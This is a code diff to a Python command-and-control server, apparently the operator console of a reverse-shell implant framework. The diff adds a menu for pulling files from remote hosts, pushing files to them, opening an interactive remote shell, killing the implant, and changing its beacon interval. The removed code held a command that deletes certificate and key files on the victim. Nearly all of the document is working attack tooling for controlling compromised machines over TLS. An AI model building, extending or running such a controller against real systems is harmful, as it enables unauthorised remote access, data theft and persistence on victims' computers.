@@ -2,8 +2,9 @@
 import socket, ssl
 from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
 from printlib import *
-from os import path, remove
+from os import path, remove, kill, getpid
 from sys import exit
+from signal import SIGTERM
 
 VERBOSE = True
 
@@ -140,13 +141,28 @@ def file_transfer_put(conn, commands):       #push file to server
     conn.send("[END]".encode('utf-8'))
     f.close()
 
+def listen_for_data(conn):
+    data = ""
+    while not data.endswith('[END]'):
+        recv = conn.recv(128)
+        recv_decoded = recv.decode('utf-8')
+        data = data + recv_decoded
+    print(data.rstrip("[END]"))
 
-def kill_session(conn, command, source):
+def kill_session(conn, source):
     print_info("Killing {}".format(source))
-    send_data(conn, command)
+    send_data(conn, "[kill]")
     conn.close()
 
 def listen():
+    options = """\
+    1 - Download a File
+    2 - Upload a File
+    3 - Kill Process (Do not beacon)
+    4 - Drop Connection (start beaconing)
+    shell - Start a Shell
+    beacon - Change Beacon Interval"""
+
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
     context.verify_mode = ssl.CERT_REQUIRED
     context.load_cert_chain(certfile='./server_cert', keyfile='./server_key')
@@ -155,10 +171,11 @@ def listen():
     bindsocket = socket.socket()
     bindsocket.bind((listen_addr, listen_port))
     bindsocket.listen(1)
-    print_info("Listening for incoming TCP connection on {}:{}".format(listen_addr,listen_port))
+    
 
     while True:
         try:
+            print_info("Listening for incoming TCP connection on {}:{}".format(listen_addr,listen_port))
             newsocket, fromaddr = bindsocket.accept()
         except KeyboardInterrupt:
             print_warn("punt")
@@ -168,72 +185,98 @@ def listen():
             conn = context.wrap_socket(newsocket, server_side=True)
             print_info("SSL established. Peer: {}".format(conn.getpeercert()))        
             source = "{}:{}".format(fromaddr[0],fromaddr[1])
+            cmd = ""
             try:
                 while True:
-                    prompt = source + ">"
-                    command = input(prompt) # Get user input and store it in command variable
+                    prompt = source + "> "
+                    if cmd == "":
+                        print(options)
+                        cmd = input(prompt) # Get user input and store it in command variable
                     #print(command)
-                    if command == 'quit' or command == 'exit':
+
+                    if cmd == 'quit' or cmd == 'exit':
                         exit()
-                    if 'kill' in command: # If we got terminate command, inform the client and close the connect and break the loop
-                        kill_session(conn, command, source)
-                        break
-                    elif 'get' in command:
-                        path_exists = True
-                        if len(command.split()) == 1:
-                            print_warn("Incomplete command") 
-                        elif len(command.split())== 2:
-                            command = command + " " + command.split()[1]
-                            file_transfer_get(conn, command)
-                        elif len(command.split())== 3:
-                            if path.dirname(command.split()[2]) != "":
-                                path_exists = path.exists(path.dirname(command.split()[2]))
-                            if path_exists:
+                    elif cmd == "1":
+                        command = input("get > ")
+                        if command != "back":
+                            command = "get " + command
+                            path_exists = True
+                            if len(command.split()) == 1:
+                                print_warn("Incomplete command") 
+                            elif len(command.split())== 2:
+                                command = command + " " + command.split()[1]
                                 file_transfer_get(conn, command)
+                            elif len(command.split())== 3:
+                                if path.dirname(command.split()[2]) != "":
+                                    path_exists = path.exists(path.dirname(command.split()[2]))
+                                if path_exists:
+                                    file_transfer_get(conn, command)
+                                else:
+                                    print_warn("Destination file path does not exist")
+                        cmd = ""
+                    elif cmd == "2":
+                        command = input("put > ")
+                        if command != "back":
+                            command = "put " + command
+                            path_exists = True
+                            if len(command.split()) == 1:
+                                print_warn("Incomplete command") 
+                            elif len(command.split()) == 2:      #put example
+                                if path.isfile(command.split()[1]):
+                                    command = command.split()[1] + " " + path.basename(command.split()[1])
+                                    file_transfer_put(conn, command)
+                                else:
+                                    print_warn("File not Found")
+                            elif len(command.split())== 3:        #put example temp  [writes example as temp]
+                                if path.isfile(command.split()[1]):
+                                    file_transfer_put(conn, command)   #(example, temp)  client will determine if arg2 destination filepath exists
+                                else:
+                                    print_warn("Unable to locate file")
+                        cmd = ""
+                    elif cmd == "3": # If we got terminate command, inform the client and close the connect and break the loop
+                        kill_session(conn, source)
+                        break
+                    elif cmd == "4":
+                        kill(getpid(), SIGTERM)
+                    elif cmd == "shell":
+                        while cmd == "shell":
+                            command = input("shell > ")
+                            forbidden = ['get ', 'get', 'put ', 'put']
+                            for item in forbidden:
+                                if item in command.split():
+                                    command = ""
+                            if command in forbidden:
+                                command = ""
+                            elif command == "back":
+                                cmd = ""
+                            elif command == "":
+                                pass
                             else:
-                                print_warn("Destination file path does not exist")
-                    elif "put" in command:
-                        path_exists = True
-                        if len(command.split()) == 1:
-                            print_warn("Incomplete command") 
-                        elif len(command.split()) == 2:      #put example
-                            if path.isfile(command.split()[1]):
-                                command = command.split()[1] + " " + path.basename(command.split()[1])
-                                file_transfer_put(conn, command)
-                            else:
-                                print_warn("File not Found")
-                        elif len(command.split())== 3:        #put example temp  [writes example as temp]
-                            if path.isfile(command.split()[1]):
-                                file_transfer_put(conn, command)   #(example, temp)  client will determine if arg2 destination filepath exists
-                            else:
-                                print_warn("Unable to locate file")
-                    
-                    elif command == "cleanup":
-                        send_data(conn, "del client_cert [END]")
-                        send_data(conn, "del client_key [END]")
-                        send_data(conn, "del server_cert [END]")
-                    elif command == "":
-                        pass
+                                data = ""
+                                send_data(conn, command)
+                                #print_info("Sent:\n"+command)
+                                while not data.endswith('[END]'):
+                                    recv = conn.recv(128)
+                                    recv_decoded = recv.decode('utf-8')
+                                    data = data + recv_decoded
+                                print(data.rstrip("[END]"))
+                                data = ""
+                    elif cmd.upper() == "BEACON":
+                        seconds = input("(seconds)/? > ")
+                        send_data(conn, "[BEACON]{}".format(seconds))
+                        listen_for_data(conn)
+                        cmd = ""
                     else:
-                        data = ""
-                        send_data(conn, command)
-                        #print_info("Sent:\n"+command)
-                        while not data.endswith('[END]'):
-                            recv = conn.recv(128)
-                            recv_decoded = recv.decode('utf-8')
-                            data = data + recv_decoded
-                        print(data.rstrip("[END]"))
-                        data = ""
+                        cmd = ""
+
             except KeyboardInterrupt:
-                kill_session(conn,"kill", source)
+                kill_session(conn, source)
         except ssl.SSLError:
             print_fail("Received Connection From Malformed (SSL) Session")
         except KeyboardInterrupt:
-            kill_session(conn,"kill", source)
+            kill_session(conn, source)
         except ConnectionAbortedError:
             print_warn("Lost Connection")
-
-    
 
 def main ():
     try:
